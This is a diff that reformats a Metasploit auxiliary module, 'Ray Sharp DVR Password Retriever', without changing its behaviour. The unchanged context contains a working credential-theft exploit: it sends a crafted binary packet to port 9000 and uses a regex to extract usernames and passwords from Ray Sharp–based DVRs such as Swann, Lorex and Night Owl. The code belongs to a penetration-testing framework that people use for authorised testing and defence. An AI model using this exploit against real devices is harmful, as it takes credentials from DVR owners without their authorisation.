@@ -1,4 +1,5 @@
 # encoding: binary
+
 ##
 # This module requires Metasploit: https://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
@@ -11,7 +12,7 @@ class MetasploitModule < Msf::Auxiliary
 
   def initialize
     super(
-      'Name'        => 'Ray Sharp DVR Password Retriever',
+      'Name' => 'Ray Sharp DVR Password Retriever',
       'Description' => %q{
           This module takes advantage of a protocol design issue with the
         Ray Sharp based DVR systems. It is possible to retrieve the username and
@@ -19,19 +20,17 @@ class MetasploitModule < Msf::Auxiliary
         this platform and exposing the same issue may include Swann, Lorex,
         Night Owl, Zmodo, URMET, and KGuard Security.
       },
-      'Author'      =>
-        [
-          'someluser', # Python script
-          'hdm'        # Metasploit module
-        ],
-      'References'  =>
-        [
-          [ 'URL', 'http://console-cowboys.blogspot.com/2013/01/swann-song-dvr-insecurity.html' ]
-        ],
-      'License'     => MSF_LICENSE
+      'Author' => [
+        'someluser', # Python script
+        'hdm' # Metasploit module
+      ],
+      'References' => [
+        [ 'URL', 'http://console-cowboys.blogspot.com/2013/01/swann-song-dvr-insecurity.html' ]
+      ],
+      'License' => MSF_LICENSE
     )
 
-    register_options( [ Opt::RPORT(9000) ])
+    register_options([ Opt::RPORT(9000) ])
   end
 
   def report_cred(opts)
@@ -64,7 +63,7 @@ class MetasploitModule < Msf::Auxiliary
     req =
       "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x0E\x0F" +
       "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x14\x00\x00\x00\x00\x00" +
-      ( "\x00" * 475 )
+      ("\x00" * 475)
 
     connect
     sock.put(req)
@@ -85,14 +84,15 @@ class MetasploitModule < Msf::Auxiliary
     disconnect
 
     info = ""
-    mac  = nil
-    ver  = nil
+    mac = nil
+    ver = nil
 
     creds = {}
 
     buf.scan(/[\x00\xff]([\x20-\x7f]{1,32})\x00+([\x20-\x7f]{1,32})\x00\x00([\x20-\x7f]{1,32})\x00/m).each do |cred|
       # Make sure the two passwords match
       next unless cred[1] == cred[2]
+
       creds[cred[0]] = cred[1]
     end
 
